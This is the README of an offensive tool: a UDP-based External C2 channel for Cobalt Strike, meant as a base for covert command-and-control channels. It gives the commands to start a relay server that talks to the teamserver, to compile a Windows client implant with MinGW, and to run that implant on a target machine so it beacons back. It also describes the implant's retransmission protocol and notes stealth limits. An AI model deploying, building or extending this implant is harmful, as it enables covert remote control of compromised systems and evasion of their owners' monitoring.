# COBALT STRIKE ROBUST UDP CHANNEL

This project provides a UDP-based communication channel for Cobalt Strike. This is meant as a base for covert channels implemented in any UDP-based protocol.

This channel guarantees in-order delivery delivery. It does this through sequence numbers and generic ACK packets. Full description is below the guide.

This channel also assumes the network uses IPv4. TCP allows for protocol-agnostic sockets, but UDP does not. Changing the socket to IPv6 currently requires editing the code.

To use the Robust UDP channel, load up Cobalt Strike and add a new External C2 listener.
This channel is configured to run on the default Teamserver port of 2222.

To start the server, run the following command:

> python3 server.py [Teamserver IP] [Python Server IP] [Port] [Pipename] [OPTIONAL:-tp TeamserverPort]

- [Teamserver IP] is the IP of your Cobalt Strike teamserver.
- [Python Server IP] is the IP of the machine you are running server.py on. (“0.0.0.0” has been found to work on Linux machines, though it is unknown if this behavior is consistent everywhere.)
- [Port] is the port that the server communicates with the client over. This is not the same port that the Python server uses to communicate with the teamserver.
- [Pipename] is the name of the pipe the client creates when it runs on the target. This could be any valid pipename.
- [TeamserverPort] is the port to connect to on the Cobalt Strike teamserver. It defaults to 2222 and is an optional argument.  

If you have the MinGW compiler installed, you may compile the client.c code with the following command:

> i686-w64-mingw32-gcc -s -O3 -fvisibility=hidden -o client.exe client.c -lws2_32

Change the client exe name if desired.
Move the resultant executable to your target machine, and then run it with the following command:

>./[Name].exe [Python Server IP] [Port] [Pipename] [Target IP] [Target Port] [Sleep]

- [Name] is the name of your client executable.
- [Python Server IP], [Port], and [Pipename] must be the same as the ones passed to server.py.
- [Target IP] is the IP address of the machine the client runs on.
- [Target Port] is the port you wish to communicate through on the target.
- [Sleep] is the sleep time (in seconds) to wait between check ins with the server.

## GUARANTEED DELIVERY DESCRIPTION

This channel uses generic ACK packets and packet sequence numbers to provide reliable data transmission over UDP.

Every packet (except for ACKs) starts with a 4-byte sequence number. In the current implementation, this number starts at 0 and increments by 1 for every successful receipt. The recipient of a packet first checks the sequence number. If it’s equal to the expected sequence number, the recipient sends a generic ACK, takes in the data, and increments the expected sequence number by 1. If the sequence number received is less than the expected sequence number, the recipient sends an ACK but doesn’t do anything else. If the sequence number received is greater than the expected sequence number, the recipient does nothing. (This is undefined behavior; the program should never reach this point.) The ACK message just consists of the word “ACK”. It does not contain an acknowledgement number.

When transmitting data, the sender sends packets one at a time. After every transmission, the sender waits until a specified timeout for an ACK packet. If no ACK is received, the sender retransmits the packet. Once the sender receives an ACK packet, they will increment their sequence number by 1 and transmit any more data if necessary.

The timeout and packet max size are defined in the code. If you change it, it is recommended that the client timeout be twice as long as the server timeout due to the server forwarding data to the teamserver and back. Currently, the timeout is 5 seconds for the server and 10 seconds for the client. The packet payload max size is currently 1024 bytes. Senders repeatedly transmit packets of that size or less until all of their data is sent. (Note: this max size does not include the sequence number, so the actual packet sent will have a payload of 1028 bytes.)

## CONSTRAINTS

- This channel expects only one client per instance of server.py. Multiple clients communicating with the same server requires multiple instances of server.py running on different ports.
- This channel does not disconnect its beacon connection. If the server goes down, the client will continue sending packet retransmissions to the dead IP address until the process is killed. This may pose stealth issues.
- The sequence numbers do not roll over, so 2^32 packets is the maximum that can be sent by either the client or the server.

## TODOS/IMPROVEMENTS

- UDP does not allow for protocol-agnostic sockets. A choice between IPv4 and IPv6 should be included as an argument passed to both programs.
- A more efficient solution than "ack every packet" should be developed. One idea I had was be to have the recipient ACK a size packet, then allocate an array to keep track of the packets received for that payload. The recipient only sends an ACK once they receive all the data, and the sender retransmits everything if they don't receive an ACK.
- Allow the user to control the timeout and packet size via commmand line arguments.
- Start the sequence number on a randomly generated value. (Both the client and the server are configured to handle receiving an arbitrary sequence number, but they don't send randomized ones as of yet.)
- Packets from the server to the client calculate the checksum incorrectly according to Wireshark. Possibly UDP Checksum Offloading.
- When capturing the entire connection, Wireshark identifies the traffic as QUIC protocol. Unknown why this is.
